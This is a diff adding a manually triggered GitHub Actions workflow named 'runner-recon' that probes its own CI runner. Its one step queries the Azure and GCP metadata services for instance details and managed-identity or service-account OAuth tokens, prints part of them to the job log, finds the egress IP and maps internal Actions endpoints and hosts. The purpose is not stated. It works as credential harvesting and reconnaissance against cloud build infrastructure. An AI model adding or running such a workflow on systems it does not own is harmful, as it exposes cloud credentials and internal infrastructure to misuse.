@@ -1,0 +1,23 @@
+name: runner-recon
+on: workflow_dispatch
+permissions: {}
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: infra probe
+        run: |
+          echo "=== IMDS instance metadata (Azure) ==="
+          curl -s --max-time 5 -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | head -c 250; echo " [rc=$?]"
+          echo "=== IMDS managed-identity token ==="
+          curl -s --max-time 5 -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | head -c 250; echo " [rc=$?]"
+          echo "=== egress IP ==="
+          curl -s --max-time 5 https://api.ipify.org; echo
+          echo "=== internal Actions endpoints (from env) ==="
+          env | grep -oiE "ACTIONS_[A-Z_]*(URL|ENDPOINT)=[^ ]*" | sed 's#=https\?://\([^/]*\).*#=\1#'
+          echo "=== runner context (non-secret) ==="
+          env | grep -iE "^(RUNNER_|ImageOS|ImageVersion|GITHUB_SERVER_URL|GITHUB_API_URL|GITHUB_GRAPHQL_URL)=" | grep -ivE "TOKEN|SECRET|KEY|PASSWORD"
+          echo "=== resolve internal actions host ==="
+          getent hosts pipelines.actions.githubusercontent.com 2>/dev/null | head -1
+          echo "=== GCP metadata (just in case) ==="
+          curl -s --max-time 4 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | head -c 120; echo " [rc=$?]"
